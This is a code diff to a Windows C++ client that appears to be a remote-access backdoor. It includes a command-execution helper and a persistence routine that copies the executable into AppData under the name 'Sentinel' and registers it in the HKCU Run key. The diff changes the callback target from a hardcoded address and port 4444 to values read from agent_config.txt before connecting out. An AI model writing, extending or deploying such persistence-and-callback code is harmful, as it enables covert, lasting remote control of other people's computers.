@@ -1,7 +1,7 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
-#include <fstream> 
+#include <fstream>
 #include <string>
 #include <sstream>
 #include <stdio.h>
@@ -25,28 +25,39 @@ std::string execCommand(const std::string& cmd) {
     return result;
 }
 
-//persistance setup copies itself to Appdata and Run key
-void addPersistence(){
+// Load IP and PORT from agent_config.txt
+bool loadConfig(std::string &ip, int &port) {
+    std::ifstream config("agent_config.txt");
+    if (!config.is_open()) {
+        std::cerr << "[!] Could not open agent_config.txt\n";
+        return false;
+    }
+    std::string line;
+    while (std::getline(config, line)) {
+        if (line.find("IP=") == 0) {
+            ip = line.substr(3);
+        } else if (line.find("PORT=") == 0) {
+            port = std::stoi(line.substr(5));
+        }
+    }
+    return !(ip.empty() || port == 0);
+}
+
+// Persistence setup
+void addPersistence() {
     char appDataPath[MAX_PATH];
     SHGetFolderPathA(NULL , CSIDL_APPDATA , NULL , 0 , appDataPath);
 
     std::string folderPath = std::string(appDataPath) + "\\Sentinel";
     std::string TargetPath = folderPath + "\\server.exe";
 
-    // if already persisted, skip 
     if(std::filesystem::exists(TargetPath)) return;
-
-    // create folder if exists 
     std::filesystem::create_directory(folderPath);
 
-    //Get path to current executable 
     char CurrentPath[MAX_PATH];
     GetModuleFileNameA(NULL , CurrentPath , MAX_PATH);
-
-    //Copy iteself to target location 
     std::filesystem::copy(CurrentPath , TargetPath , std::filesystem::copy_options::overwrite_existing);
 
-    //Set registery key to run on startup 
     HKEY hkey; 
     RegOpenKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
     RegSetValueExA(hkey, "Sentinel", 0, REG_SZ, (BYTE*)TargetPath.c_str(), TargetPath.size() + 1);
@@ -57,6 +68,13 @@ int main() {
     std::cerr << "[*] Starting client\n";
 
     addPersistence();
+
+    std::string serverIP;
+    int serverPort = 0;
+    if (!loadConfig(serverIP, serverPort)) {
+        std::cerr << "[!] Invalid or missing config.\n";
+        return 1;
+    }
 
     WSADATA wsaData;
     int wsInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -76,8 +94,8 @@ int main() {
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(4444);
-    serverAddr.sin_addr.s_addr = inet_addr("192.168.0.103");  // CHANGE IF NEEDED
+    serverAddr.sin_port = htons(serverPort);
+    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
 
     std::cerr << "[*] Attempting to connect...\n";
     int connectionResult = connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));
